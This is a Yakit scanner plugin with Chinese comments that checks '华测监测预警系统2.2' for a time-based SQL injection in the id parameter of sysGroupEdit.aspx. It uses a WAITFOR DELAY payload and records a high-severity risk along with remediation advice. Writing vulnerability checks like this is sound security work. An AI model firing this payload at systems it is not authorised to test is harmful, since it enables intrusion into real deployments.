script_name: 华测监测预警系统2.2 sysGroupEdit.aspx SQL注入
content:
# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target, port) {
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    # 完整的GET请求包（包含延时注入payload）
    packet = `GET /Web/SysManage/sysGroupEdit.aspx?id=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27-- HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Connection: close

`

    # 记录请求开始时间
    start_time = time.Now()

    # 发送请求
    rsp, req, _ = poc.HTTP(
        packet,
        poc.params({"target": addr}),
        poc.https(isTls),
        poc.timeout(10),  # 设置10秒超时
        poc.redirectTimes(0)
    )

    # 计算响应时间
    response_time = time.Since(start_time)

    # 漏洞判断：响应时间≥5秒且状态码为200
    if poc.GetStatusCodeFromResponse(rsp) == 200 && response_time.Seconds() >= 5 {
        yakit.Info("%v 存在华测监测预警系统2.2 SQL注入漏洞", addr)
        risk.NewRisk(
            addr,
            risk.title("华测监测预警系统2.2 sysGroupEdit.aspx SQL注入漏洞"),
            risk.severity("high"),
            risk.description("华测监测预警系统2.2版本中，/Web/SysManage/sysGroupEdit.aspx文件的id参数存在SQL注入漏洞，攻击者可通过WAITFOR DELAY触发时间延迟，进而执行任意SQL命令。"),
            risk.solution("1. 使用参数化查询\n2. 对用户输入进行严格过滤\n3. 升级到最新版本"),
            risk.request(string(req)),
            risk.response(string(rsp)[:512]),  # 截断响应
            risk.cve(""),  # 若无CVE可留空
        )
    }
}

handle = func(result /* *fp.MatchResult */) {
    if !result.IsOpen() {
        return
    }

    if len(result.Fingerprint.HttpFlows) > 0 {
        handleCheck(result.Target, result.Port)
    }
}
